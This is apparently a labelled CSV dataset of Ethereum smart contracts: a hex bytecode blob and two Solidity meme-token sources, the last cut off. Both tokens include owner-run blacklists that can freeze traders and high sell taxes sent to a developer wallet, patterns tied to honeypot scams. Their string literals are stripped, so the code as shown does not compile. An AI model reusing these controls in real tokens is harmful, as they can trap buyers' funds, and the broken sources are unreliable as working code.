1f60248201527f63616e6e6f74207472616e7366657220746f2061646472657373207a65726f00604482015290519081900360640190fd5b600160a060020a03831660009081526007602052604090205460ff16158015610fe55750600160a060020a03841660009081526007602052604090205460ff16155b801561100157503360009081526007602052604090205460ff16155b1515611045576040805160e560020a62461bcd02815260206004820152600e60248201526000805160206132b5833981519152604482015290519081900360640190fd5b600160a060020a0384166000908152600160205260409020548211156110b5576040805160e560020a62461bcd02815260206004820152601260248201527f696e73756666696369656e742066756e64730000000000000000000000000000604482015290519081900360640190fd5b600160a060020a0384166000908152600360209081526040808320338452909152902054821115611130576040805160e560020a62461bcd02815260206004820152601660248201527f696e73756666696369656e7420616c6c6f77616e636500000000000000000000604482015290519081900360640190fd5b600160a060020a038416600090815260016020526040902054611159908363ffffffff61328416565b600160a060020a03808616600090815260016020526040808220939093559085168152205461118e908363ffffffff61329b16565b600160a060020a0380851660009081526001602090815260408083209490945591871681526003825282812033825290915220546111d2908363ffffffff61328416565b600160a060020a03808616600081815260036020908152604080832033845282529182902094909455805186815290519287169391926000805160206132f5833981519152929181900390910190a35060019392505050565b604080517f454950373132446f6d61696e28737472696e67206e616d652c6164647265737381527f20766572696679696e67436f6e7472616374290000000000000000000000000060208083019190915282519182900360330182208284018452600b8084527f42696e616e63652055534400000000000000000000000000000000000000000092840192835293519093909182918083835b602083106112e35780518252601f1990920191602091820191016112c4565b51815160209384036101000a60001901801990921691161790526040805192909401829003822082820197909752818401969096523060608083019190915283518083039091018152608090910192839052805190959294508493509185019190508083835b602083106113685780518252601f199092019160209182019101611349565b5181516020939093036101000a60001901801990911692169190911790526040519201829003909120600c55505050565b601281565b600454600160a060020a031633146113ee576040805160e560020a62461bcd0281526020600482015260096024820152600080516020613315833981519152604482015290519081900360640190fd5b60055460a060020a900460ff161515611451576040805160e560020a62461bcd02815260206004820152601060248201527f616c726561647920756e70617573656400000000000000000000000000000000604482015290519081900360640190fd5b6005805474ff0000000000000000000000000000000000000000191690556040517f7805862f689e2f13df9f062ff482ad3ad112aca9e0847911ed832e158c525b3390600090a1565b600654600160a060020a031633146114fc576040805160e560020a62461bcd02815260206004820152601760248201527f6f6e6c79417373657450726f74656374696f6e526f6c65000000000000000000604482015290519081900360640190fd5b600160a060020a03811660009081526007602052604090205460ff16151561156e576040805160e560020a62461bcd02815260206004820152601860248201527f6164647265737320616c726561647920756e66726f7a656e0000000000000000604482015290519081900360640190fd5b600160a060020a038116600081815260076020526040808220805460ff19169055517fc3776b472ebf54114339eec9e4dc924e7ce307a97f5c1ee72b6d474e6e5e8b7c9190a250565b600554600090600160a060020a0316331461161c576040805160e560020a62461bcd02815260206004820152601160248201527f6f6e6c7950726f706f7365644f776e6572000000000000000000000000000000604482015290519081900360640190fd5b506004805460058054600160a060020a0319808416600160a060020a038381169190911795869055911690915560405191811692169082907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e090600090a350565b600854600160a060020a03163314806116a05750600454600160a060020a031633145b15156116f6576040805160e560020a62461bcd02815260206004820152601e60248201527f6f6e6c7920537570706c79436f6e74726f6c6c6572206f72204f776e65720000604482015290519081900360640190fd5b600160a060020a038116151561177c576040805160e560020a62461bcd02815260206004820152602c60248201527f63616e6e6f742073657420737570706c7920636f6e74726f6c6c657220746f2060448201527f61646472657373207a65726f0000000000000000000000000000000000000000606482015290519081900360840190fd5b600854604051600160a060020a038084169216907f40d53b0b666e4424f29d55244e7e171a1dc332acc11d04ed4abd884629d8cc9790600090a360088054600160a060020a031916600160a060020a0392909216919091179055565b60055460a060020a900460ff1681565b600160a060020a031660009081526001602052604090205490565b60005460ff161561185e576040805160e560020a62461bcd02815260206004820152601360248201527f616c726561647920696e697469616c697a656400000000000000000000000000604482015290519081900360640190fd5b6004805433600160a060020a031991821681179092556005805482169055600680548216905560006002819055600880549092169092179055805460ff19166001179055565b600454600160a060020a031633146118f4576040805160e560020a62461bcd0281526020600482015260096024820152600080516020613315833981519152604482015290519081900360640190fd5b60055460a060020a900460ff1615611956576040805160e560020a62461bcd02815260206004820152600e60248201527f616c726561647920706175736564000000000000000000000000000000000000604482015290519081900360640190fd5b6005805474ff0000000000000000000000000000000000000000191660a060020a1790556040517f6985a02210a168e66602d3235cb6db0e70f92b3ba4d376a33c0f3d9434bff62590600090a1565b600160a060020a03166000908152600b602052604090205490565b600654600160a060020a03163314806119e35750600454600160a060020a031633145b1515611a5f576040805160e560020a62461bcd02815260206004820152602160248201527f6f6e6c7920617373657450726f74656374696f6e526f6c65206f72204f776e6560448201527f7200000000000000000000000000000000000000000000000000000000000000606482015290519081900360840190fd5b600654604051600160a060020a038084169216907fd0c36a0ac0fe0d375386bd568fa2947a2dae7523a0a0cfdab20b7532a105bd1b90600090a360068054600160a060020a031916600160a060020a0392909216919091179055565b600654600160a060020a03163314611b1d576040805160e560020a62461bcd02815260206004820152601760248201527f6f6e6c79417373657450726f74656374696f6e526f6c65000000000000000000604482015290519081900360640190fd5b600160a060020a03811660009081526007602052604090205460ff1615611b8e576040805160e560020a62461bcd02815260206004820152601660248201527f6164647265737320616c72656164792066726f7a656e00000000000000000000604482015290519081900360640190fd5b600160a060020a038116600081815260076020526040808220805460ff19166001179055517f90811a8edd3b3c17eeaefffc17f639cc69145d41a359c9843994dc25382036909190a250565b600454600160a060020a031681565b60408051808201909152600481527f4255534400000000000000000000000000000000000000000000000000000000602082015281565b600954600160a060020a0316331480611c435750600454600160a060020a031633145b1515611c99576040805160e560020a62461bcd02815260206004820152601960248201527f6f6e6c792057686974656c6973746572206f72204f776e657200000000000000604482015290519081900360640190fd5b60098054600160a060020a031916600160a060020a0383811691821792839055604051919216907f54e20b07412504aee4d17519747ae2f01b9924f7f30059793fe5576c4220a0c390600090a350565b600854600090600160a060020a03163314611d4e576040805160e560020a62461bcd02815260206004820152601460248201527f6f6e6c79537570706c79436f6e74726f6c6c6572000000000000000000000000604482015290519081900360640190fd5b600854600160a060020a0316600090815260016020526040902054821115611dc0576040805160e560020a62461bcd02815260206004820152601160248201527f6e6f7420656e6f75676820737570706c79000000000000000000000000000000604482015290519081900360640190fd5b600854600160a060020a0316600090815260016020526040902054611deb908363ffffffff61328416565b600854600160a060020a0316600090815260016020526040902055600254611e19908363ffffffff61328416565b600255600854604080518481529051600160a060020a03909216917f1b7e18241beced0d7f41fbab1ea8ed468732edbcb74ec4420151654ca71c8a639181900360200190a2600854604080518481529051600092600160a060020a0316916000805160206132f5833981519152919081900360200190a3506001919050565b600160a060020a03166000908152600a602052604090205460ff1690565b60055460009060a060020a900460ff1615611f09576040805160e560020a62461bcd02815260206004820152600d60248201526000805160206132d5833981519152604482015290519081900360640190fd5b600160a060020a0383161515611f69576040805160e560020a62461bcd02815260206004820152601f60248201527f63616e6e6f74207472616e7366657220746f2061646472657373207a65726f00604482015290519081900360640190fd5b600160a060020a03831660009081526007602052604090205460ff16158015611fa257503360009081526007602052604090205460ff16155b1515611fe6576040805160e560020a62461bcd02815260206004820152600e60248201526000805160206132b5833981519152604482015290519081900360640190fd5b3360009081526001602052604090205482111561204d576040805160e560020a62461bcd02815260206004820152601260248201527f696e73756666696369656e742066756e64730000000000000000000000000000604482015290519081900360640190fd5b3360009081526001602052604090205461206d908363ffffffff61328416565b3360009081526001602052604080822092909255600160a060020a0385168152205461209f908363ffffffff61329b16565b600160a060020a0384166000818152600160209081526040918290209390935580518581529051919233926000805160206132f58339815191529281900390910190a350600192915050565b600954600160a060020a0316331461214d576040805160e560020a62461bcd02815260206004820152601b60248201527f6f6e6c794265746144656c656761746557686974656c69737465720000000000604482015290519081900360640190fd5b600160a060020a0381166000908152600a602052604090205460ff16156121be576040805160e560020a62461bcd02815260206004820152601c60248201527f64656c656761746520616c72656164792077686974656c697374656400000000604482015290519081900360640190fd5b600160a060020a0381166000818152600a6020526040808220805460ff19166001179055517f8a22e0d8ecb02260464e9a55b7d82b17482735ae1f765de59dee573dfec5b36d9190a250565b600454600160a060020a0316331461225a576040805160e560020a62461bcd0281526020600482015260096024820152600080516020613315833981519152604482015290519081900360640190fd5b600160a060020a03811615156122e0576040805160e560020a62461bcd02815260206004820152602960248201527f63616e6e6f74207472616e73666572206f776e65727368697020746f2061646460448201527f72657373207a65726f0000000000000000000000000000000000000000000000606482015290519081900360840190fd5b33600160a060020a0382161415612341576040805160e560020a62461bcd02815260206004820152601760248201527f63616c6c657220616c7265616479206973206f776e6572000000000000000000604482015290519081900360640190fd5b60058054600160a060020a031916600160a060020a038381169190911791829055600454604051928216929116907ff4e75b79500ab730f8a026ed3cba6d55331bcb64c9e9f60c548e371356e5e3c090600090a350565b600854600090600160a060020a031633146123fd576040805160e560020a62461bcd02815260206004820152601460248201527f6f6e6c79537570706c79436f6e74726f6c6c6572000000000000000000000000604482015290519081900360640190fd5b600254612410908363ffffffff61329b16565b600255600854600160a060020a031660009081526001602052604090205461243e908363ffffffff61329b16565b60088054600160a060020a03908116600090815260016020908152604091829020949094559154825186815292519116927ff5c174d57843e57fea3c649fdde37f015ef08750759cbee88060390566a98797928290030190a2600854604080518481529051600160a060020a03909216916000916000805160206132f5833981519152919081900360200190a3506001919050565b600954600160a060020a031681565b600554600160a060020a031681565b600954600160a060020a03163314612553576040805160e560020a62461bcd02815260206004820152601b60248201527f6f6e6c794265746144656c656761746557686974656c69737465720000000000604482015290519081900360640190fd5b600160a060020a0381166000908152600a602052604090205460ff1615156125c5576040805160e560020a62461bcd02815260206004820152601860248201527f64656c6567617465206e6f742077686974656c69737465640000000000000000604482015290519081900360640190fd5b600160a060020a0381166000818152600a6020526040808220805460ff19169055517f12acb305bec2ecc1e4568decc9c8e0423749ceb6ae249eaef4ef375ec174a49c9190a250565b600160a060020a03918216600090815260036020908152604080832093909416825291909152205490565b600654600090600160a060020a0316331461269e576040805160e560020a62461bcd02815260206004820152601760248201527f6f6e6c79417373657450726f74656374696f6e526f6c65000000000000000000604482015290519081900360640190fd5b600160a060020a03821660009081526007602052604090205460ff161515612710576040805160e560020a62461bcd02815260206004820152601560248201527f61646472657373206973206e6f742066726f7a656e0000000000000000000000604482015290519081900360640190fd5b50600160a060020a03811660009081526001602052604081208054919055600254612741908263ffffffff61328416565b600255604051600160a060020a038316907ffc5960f1c5a5d2b60f031bf534af053b1bf7d9881989afaeb8b1d164db23aede90600090a2604080518281529051600160a060020a038416917f1b7e18241beced0d7f41fbab1ea8ed468732edbcb74ec4420151654ca71c8a63919081900360200190a2604080518281529051600091600160a060020a038516916000805160206132f58339815191529181900360200190a35050565b600c5481565b600160a060020a031660009081526007602052604090205460ff1690565b600854600160a060020a031681565b600454600090600160a060020a03163314612870576040805160e560020a62461bcd0281526020600482015260096024820152600080516020613315833981519152604482015290519081900360640190fd5b5030600090815260016020526040808220805490839055600454600160a060020a031683529120546128a8908263ffffffff61329b16565b60048054600160a060020a039081166000908152600160209081526040918290209490945591548251858152925191169230926000805160206132f5833981519152929081900390910190a350565b60055460009081908190819060a060020a900460ff1615612950576040805160e560020a62461bcd02815260206004820152600d60248201526000805160206132d5833981519152604482015290519081900360640190fd5b336000908152600a602052604090205460ff1615156129df576040805160e560020a62461bcd02815260206004820152602f60248201527f426574612066656174757265206f6e6c7920616363657074732077686974656c60448201527f69737465642064656c6567617465730000000000000000000000000000000000606482015290519081900360840190fd5b60008811806129ee5750600087115b1515612a6a576040805160e560020a62461bcd02815260206004820152602960248201527f63616e6e6f74207472616e73666572207a65726f20746f6b656e73207769746860448201527f207a65726f206665650000000000000000000000000000000000000000000000606482015290519081900360840190fd5b43851015612ac2576040805160e560020a62461bcd02815260206004820152601360248201527f7472616e73616374696f6e206578706972656400000000000000000000000000604482015290519081900360640190fd5b7f7fffffffffffffffffffffffffffffff5d576e7357a4501ddfe92f46681b20a08b1115612b3a576040805160e560020a62461bcd02815260206004820152601360248201527f7369676e617475726520696e636f727265637400000000000000000000000000604482015290519081900360640190fd5b8960ff16601b1480612b4f57508960ff16601c145b1515612ba5576040805160e560020a62461bcd02815260206004820152601360248201527f7369676e617475726520696e636f727265637400000000000000000000000000604482015290519081900360640190fd5b604080517f4265746144656c6567617465645472616e73666572286164647265737320746f81527f2c75696e743235362076616c75652c75696e74323536206665652c75696e74326020808301919091527f3536207365712c75696e7432353620646561646c696e6529000000000000000082840152825191829003605801822082820152600160a060020a038c1682840152606082018b9052608082018a905260a0820189905260c08083018990528351808403909101815260e090920192839052815191929182918401908083835b60208310612c955780518252601f199092019160209182019101612c76565b51815160209384036101000a600019018019909216911617905260408051929094018290038220828501855260028084527f1901000000000000000000000000000000000000000000000000000000000000848401908152600c549651929b509397509495508994910192508291908083835b60208310612d275780518252601f199092019160209182019101612d08565b51815160209384036101000a6000190180199092169116179052920194855250838101929092525060408051808403830181529281019081905282519293509182918401908083835b60208310612d8f5780518252601f199092019160209182019101612d70565b6001836020036101000a038019825116818451168082178552505050505050905001915050604051809103902091506001828b8e8e604051600081526020016040526040518085600019166000191681526020018460ff1660ff168152602001836000191660001916815260200182600019166000191681526020019450505050506020604051602081039080840390855afa158015612e33573d6000803e3d6000fd5b5050604051601f190151915050600160a060020a0381161515612ec6576040805160e560020a62461bcd02815260206004820152602d60248201527f6572726f722064657465726d696e696e672066726f6d2061646472657373206660448201527f726f6d207369676e617475726500000000000000000000000000000000000000606482015290519081900360840190fd5b600160a060020a0389161515612f26576040805160e560020a62461bcd02815260206004820152601660248201527f63616e6e6f207573652061646472657373207a65726f00000000000000000000604482015290519081900360640190fd5b600160a060020a03891660009081526007602052604090205460ff16158015612f685750600160a060020a03811660009081526007602052604090205460ff16155b8015612f8457503360009081526007602052604090205460ff16155b1515612fc8576040805160e560020a62461bcd02815260206004820152600e60248201526000805160206132b5833981519152604482015290519081900360640190fd5b600160a060020a038116600090815260016020526040902054612ff1898963ffffffff61329b16565b1115613047576040805160e560020a62461bcd02815260206004820152601060248201527f696e737566666963656e742066756e6400000000000000000000000000000000604482015290519081900360640190fd5b600160a060020a0381166000908152600b602052604090205486146130b6576040805160e560020a62461bcd02815260206004820152600d60248201527f696e636f72726563742073657100000000000000000000000000000000000000604482015290519081900360640190fd5b600160a060020a0381166000908152600b60205260409020546130e090600163ffffffff61329b16565b600160a060020a0382166000908152600b602052604090205561313161310c898963ffffffff61329b16565b600160a060020a0383166000908152600160205260409020549063ffffffff61328416565b600160a060020a03821660009081526001602052604090205586156131b45733600090815260016020526040902054613170908863ffffffff61329b16565b336000818152600160209081526040918290209390935580518a815290519192600160a060020a038516926000805160206132f58339815191529281900390910190a35b600160a060020a0389166000908152600160205260409020546131dd908963ffffffff61329b16565b600160a060020a03808b166000818152600160209081526040918290209490945580518c815290519193928516926000805160206132f583398151915292918290030190a360408051898152602081018890528082018990529051600160a060020a03808c1692908416917fe526c2818be85606ab8e0ea3f317c198ef15baabbb4430bcf2d836eed3c7769b9181900360600190a35060019b9a5050505050505050505050565b6000808383111561329457600080fd5b5050900390565b6000828201838110156132ad57600080fd5b93925050505600616464726573732066726f7a656e0000000000000000000000000000000000007768656e4e6f7450617573656400000000000000000000000000000000000000ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef6f6e6c794f776e65720000000000000000000000000000000000000000000000a165627a7a72305820a3a098dbe15a0b9829e3803e96c5f1cc1989d221ac5dedb0c684481fa09b6a290029,,,,,,,0,,,,,,,,,,0
"// SPDX-License-Identifier: MIT pragma solidity 0.8.17; abstract contract Context { function _msgSender() internal view virtual returns (address) { return msg.sender; } } interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value); } library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, ); } function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, ); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, ); } function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; } } contract Ownable is Context { address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); constructor () { address msgSender = _msgSender(); _owner = msgSender; emit OwnershipTransferred(address(0), msgSender); } function owner() public view returns (address) { return _owner; } modifier onlyOwner() { require(_owner == _msgSender(), ); _; } function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); } } interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair); } interface IUniswapV2Router02 { function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external; function factory() external pure returns (address); function WETH() external pure returns (address); function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity); } contract moroiinueth is Context, IERC20, Ownable { using SafeMath for uint256; mapping (address => uint256) private _balances; mapping (address => mapping (address => uint256)) private _allowances; mapping (address => bool) private _isExcludedFromFee; mapping (address => bool) private bots; mapping(address => uint256) private _holderLastTransferTimestamp; bool public transferDelayEnabled = false; address payable private _taxWallet; uint256 private _initialBuyTax=15; uint256 private _initialSellTax=15; uint256 private _finalBuyTax=5; uint256 private _finalSellTax=5; uint256 private _reduceBuyTaxAt=1; uint256 private _reduceSellTaxAt=5; uint256 private _preventSwapBefore=25; uint256 private _buyCount=0; uint8 private constant _decimals = 8; uint256 private constant _tTotal = 1000000000 * 10**_decimals; string private constant _name = unicode; string private constant _symbol = unicode; uint256 public _maxTxAmount = 20000000 * 10**_decimals; uint256 public _maxWalletSize = 20000000 * 10**_decimals; uint256 public _taxSwapThreshold= 15000000 * 10**_decimals; uint256 public _maxTaxSwap= 15000000 * 10**_decimals; IUniswapV2Router02 private uniswapV2Router; address private uniswapV2Pair; bool private tradingOpen; bool private inSwap = false; bool private swapEnabled = false; event MaxTxAmountUpdated(uint _maxTxAmount); modifier lockTheSwap { inSwap = true; _; inSwap = false; } constructor () { _taxWallet = payable(_msgSender()); _balances[_msgSender()] = _tTotal; _isExcludedFromFee[owner()] = true; _isExcludedFromFee[address(this)] = true; _isExcludedFromFee[_taxWallet] = true; emit Transfer(address(0), _msgSender(), _tTotal); } function name() public pure returns (string memory) { return _name; } function symbol() public pure returns (string memory) { return _symbol; } function decimals() public pure returns (uint8) { return _decimals; } function totalSupply() public pure override returns (uint256) { return _tTotal; } function balanceOf(address account) public view override returns (uint256) { return _balances[account]; } function transfer(address recipient, uint256 amount) public override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) { _transfer(sender, recipient, amount); _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, )); return true; } function _approve(address owner, address spender, uint256 amount) private { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _transfer(address from, address to, uint256 amount) private { require(from != address(0), ); require(to != address(0), ); require(amount > 0, ); uint256 taxAmount=0; if (from != owner() && to != owner()) { require(!bots[from] && !bots[to]); taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100); if (transferDelayEnabled) { if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) { require( _holderLastTransferTimestamp[tx.origin] < block.number, ); _holderLastTransferTimestamp[tx.origin] = block.number; } } if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) { require(amount <= _maxTxAmount, ); require(balanceOf(to) + amount <= _maxWalletSize, ); _buyCount++; } if(to == uniswapV2Pair && from!= address(this) ){ taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100); } uint256 contractTokenBalance = balanceOf(address(this)); if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold && _buyCount>_preventSwapBefore) { swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap))); uint256 contractETHBalance = address(this).balance; if(contractETHBalance > 0) { sendETHToFee(address(this).balance); } } } if(taxAmount>0){ _balances[address(this)]=_balances[address(this)].add(taxAmount); emit Transfer(from, address(this),taxAmount); } _balances[from]=_balances[from].sub(amount); _balances[to]=_balances[to].add(amount.sub(taxAmount)); emit Transfer(from, to, amount.sub(taxAmount)); } function min(uint256 a, uint256 b) private pure returns (uint256){ return (a>b)?b:a; } function swapTokensForEth(uint256 tokenAmount) private lockTheSwap { address[] memory path = new address[](2); path[0] = address(this); path[1] = uniswapV2Router.WETH(); _approve(address(this), address(uniswapV2Router), tokenAmount); uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenAmount, 0, path, address(this), block.timestamp ); } function removeLimits() external onlyOwner{ _maxTxAmount = _tTotal; _maxWalletSize=_tTotal; transferDelayEnabled=false; emit MaxTxAmountUpdated(_tTotal); } function sendETHToFee(uint256 amount) private { _taxWallet.transfer(amount); } function addBots(address[] memory bots_) public onlyOwner { for (uint i = 0; i < bots_.length; i++) { bots[bots_[i]] = true; } } function delBots(address[] memory notbot) public onlyOwner { for (uint i = 0; i < notbot.length; i++) { bots[notbot[i]] = false; } } function isBot(address a) public view returns (bool){ return bots[a]; } function openTrading() external onlyOwner() { require(!tradingOpen,); uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); _approve(address(this), address(uniswapV2Router), _tTotal); uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH()); uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp); IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max); swapEnabled = true; tradingOpen = true; } receive() external payable {} function manualSwap() external { require(_msgSender()==_taxWallet); uint256 tokenBalance=balanceOf(address(this)); if(tokenBalance>0){ swapTokensForEth(tokenBalance); } uint256 ethBalance=address(this).balance; if(ethBalance>0){ sendETHToFee(ethBalance); } } }",,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,0
"pragma solidity ^0.8.9;abstract contract Context { function _msgSender() internal view virtual returns (address) { return msg.sender; }}interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval( address indexed owner, address indexed spender, uint256 value );}contract Ownable is Context { address private _owner; address private _previousOwner; event OwnershipTransferred( address indexed previousOwner, address indexed newOwner ); constructor() { address msgSender = _msgSender(); _owner = msgSender; emit OwnershipTransferred(address(0), msgSender); } function owner() public view returns (address) { return _owner; } modifier onlyOwner() { require(_owner == _msgSender(), ); _; } function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); } function transferOwnership(address newOwner) public virtual onlyOwner { require(newOwner != address(0), ); emit OwnershipTransferred(_owner, newOwner); _owner = newOwner; }}library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, ); } function sub( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, ); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, ); } function div( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; }}interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair);}interface IUniswapV2Router02 { function swapExactTokensForETHSupportingFeeOnTransferTokens( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external; function factory() external pure returns (address); function WETH() external pure returns (address); function addLiquidityETH( address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline ) external payable returns ( uint256 amountToken, uint256 amountETH, uint256 liquidity );}contract SHIBA is Context, IERC20, Ownable { using SafeMath for uint256; string private constant _name = ; string private constant _symbol = ; uint8 private constant _decimals = 9; mapping(address => uint256) private _rOwned; mapping(address => uint256) private _tOwned; mapping(address => mapping(address => uint256)) private _allowances; mapping(address => bool) private _isExcludedFromFee; uint256 private constant MAX = ~uint256(0); uint256 private constant _tTotal = 1000000000 * 10**9; uint256 private _rTotal = (MAX - (MAX % _tTotal)); uint256 private _tFeeTotal; uint256 private _redisFeeOnBuy = 0; uint256 private _taxFeeOnBuy = 20; uint256 private _redisFeeOnSell = 0; uint256 private _taxFeeOnSell = 30; uint256 private _redisFee = _redisFeeOnSell; uint256 private _taxFee = _taxFeeOnSell; uint256 private _previousredisFee = _redisFee; uint256 private _previoustaxFee = _taxFee; mapping(address => bool) public bots; mapping (address => uint256) public _buyMap; address payable private _developmentAddress = payable(0x781E15FE5aa81527C42d77b9069f503B631B3F84); address payable private _marketingAddress = payable(0x781E15FE5aa81527C42d77b9069f503B631B3F84); IUniswapV2Router02 public uniswapV2Router; address public uniswapV2Pair; bool private tradingOpen = true; bool private inSwap = false; bool private swapEnabled = true; uint256 public _maxTxAmount = _tTotal * 2 / 100; uint256 public _maxWalletSize = _tTotal * 2 / 100; uint256 public _swapTokensAtAmount = _tTotal * 3 / 1000; event MaxTxAmountUpdated(uint256 _maxTxAmount); modifier lockTheSwap { inSwap = true; _; inSwap = false; } constructor() { _rOwned[_msgSender()] = _rTotal; IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); uniswapV2Router = _uniswapV2Router; uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()) .createPair(address(this), _uniswapV2Router.WETH()); _isExcludedFromFee[owner()] = true; _isExcludedFromFee[address(this)] = true; _isExcludedFromFee[_developmentAddress] = true; _isExcludedFromFee[_marketingAddress] = true; emit Transfer(address(0), _msgSender(), _tTotal); } function name() public pure returns (string memory) { return _name; } function symbol() public pure returns (string memory) { return _symbol; } function decimals() public pure returns (uint8) { return _decimals; } function totalSupply() public pure override returns (uint256) { return _tTotal; } function balanceOf(address account) public view override returns (uint256) { return tokenFromReflection(_rOwned[account]); } function transfer(address recipient, uint256 amount) public override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom( address sender, address recipient, uint256 amount ) public override returns (bool) { _transfer(sender, recipient, amount); _approve( sender, _msgSender(), _allowances[sender][_msgSender()].sub( amount, ) ); return true; } function tokenFromReflection(uint256 rAmount) private view returns (uint256) { require( rAmount <= _rTotal, ); uint256 currentRate = _getRate(); return rAmount.div(currentRate); } function removeAllFee() private { if (_redisFee == 0 && _taxFee == 0) return; _previousredisFee = _redisFee; _previoustaxFee = _taxFee; _redisFee = 0; _taxFee = 0; } function restoreAllFee() private { _redisFee = _previousredisFee; _taxFee = _previoustaxFee; } function _approve( address owner, address spender, uint256 amount ) private { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _transfer( address from, address to, uint256 amount ) private { require(from != address(0), ); require(to != address(0), ); require(amount > 0, ); if (from != owner() && to != owner()) { if (!tradingOpen) { require(from == owner(), ); } require(amount <= _maxTxAmount, ); require(!bots[from] && !bots[to], ); if(to != uniswapV2Pair) { require(balanceOf(to) + amount < _maxWalletSize, ); } uint256 contractTokenBalance = balanceOf(address(this)); bool canSwap = contractTokenBalance >= _swapTokensAtAmount; if(contractTokenBalance >= _maxTxAmount) { contractTokenBalance = _maxTxAmount; } if (canSwap && !inSwap && from != uniswapV2Pair && swapEnabled && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) { swapTokensForEth(contractTokenBalance); uint256 contractETHBalance = address(this).balance; if (contractETHBalance > 0) { sendETHToFee(address(this).balance); } } } bool takeFee = true; if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) { takeFee = false; } else { if(from == uniswapV2Pair && to != address(uniswapV2Router)) { _redisFee = _redisFeeOnBuy; _taxFee = _taxFeeOnBuy; } if (to == uniswapV2Pair && from != address(uniswapV2Router)) { _redisFee = _redisFeeOnSell; _taxFee = _taxFeeOnSell; } } _tokenTransfer(from, to, amount, takeFee); } function swapTokensForEth(uint256 tokenAmount) private lockTheSwap { address[] memory path = new address[](2); path[0] = address(this); path[1] = uniswapV2Router.WETH(); _approve(address(this), address(uniswapV2Router), tokenAmount); uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenAmount, 0, path, address(this), block.timestamp ); } function sendETHToFee(uint256 amount) private { _marketingAddress.transfer(amount); } function setTrading(bool _tradingOpen) public onlyOwner { 